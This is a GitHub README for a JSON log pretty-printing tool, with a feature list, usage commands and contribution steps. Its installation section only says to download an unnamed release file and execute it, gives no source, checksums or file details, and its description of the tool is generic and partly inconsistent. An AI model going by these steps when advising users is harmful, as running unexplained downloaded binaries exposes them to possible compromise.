# Human Readable JSON Logging 📝

![GitHub release](https://img.shields.io/github/release/SamirPlay/human-readable-json-logging.svg) ![GitHub issues](https://img.shields.io/github/issues/SamirPlay/human-readable-json-logging.svg) ![GitHub forks](https://img.shields.io/github/forks/SamirPlay/human-readable-json-logging.svg) ![GitHub stars](https://img.shields.io/github/stars/SamirPlay/human-readable-json-logging.svg)

Welcome to the **Human Readable JSON Logging** repository! This tool helps you pretty print JSON log streams directly from a running process. With it, you can transform structured log data into a human-readable format. 

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Features 🌟

- **Pretty Print**: Easily convert JSON logs into a readable format.
- **Structured Logging**: Supports structured logging for better organization.
- **Integration**: Works seamlessly with ELK stack.
- **Lightweight**: Minimal resource usage while running.
- **Real-time Logging**: View logs in real-time as they are generated.

## Installation ⚙️

To get started, you need to download the latest release of the tool. Visit the [Releases section](https://github.com/SamirPlay/human-readable-json-logging/releases) to find the latest version. Download the appropriate file for your system and execute it.

### Step-by-Step Installation

1. **Visit the Releases Page**: Go to [Releases](https://github.com/SamirPlay/human-readable-json-logging/releases).
2. **Download the File**: Choose the file that matches your operating system.
3. **Execute the File**: Follow the instructions provided in the release notes for execution.

## Usage 📖

Once you have installed the tool, you can start using it to pretty print JSON logs.

### Basic Command

To run the tool, use the following command in your terminal:

```bash
./human-readable-json-logging <your-json-log-file>
```

### Options

You can customize the output with various options:

- `--output-format`: Specify the output format (e.g., pretty, compact).
- `--filter`: Filter logs based on certain criteria.
- `--help`: Display help information.

### Example

Here's a quick example of how to use the tool:

```bash
./human-readable-json-logging logs.json --output-format pretty
```

This command will take the `logs.json` file and print it in a readable format.

## Contributing 🤝

We welcome contributions to improve this tool. If you want to help, please follow these steps:

1. **Fork the Repository**: Click on the "Fork" button at the top right of the page.
2. **Create a Branch**: Use a descriptive name for your branch.
   ```bash
   git checkout -b feature/your-feature-name
   ```
3. **Make Changes**: Implement your changes and test them.
4. **Commit Your Changes**: Write a clear commit message.
   ```bash
   git commit -m "Add feature X"
   ```
5. **Push to Your Branch**: 
   ```bash
   git push origin feature/your-feature-name
   ```
6. **Open a Pull Request**: Go to the original repository and click on "New Pull Request."

## License 📄

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact 📧

For questions or feedback, please reach out:

- **Author**: SamirPlay
- **Email**: samirplay@example.com
- **GitHub**: [SamirPlay](https://github.com/SamirPlay)

---

Thank you for using **Human Readable JSON Logging**! We hope it makes your logging tasks easier and more efficient. For more updates, check the [Releases section](https://github.com/SamirPlay/human-readable-json-logging/releases) regularly.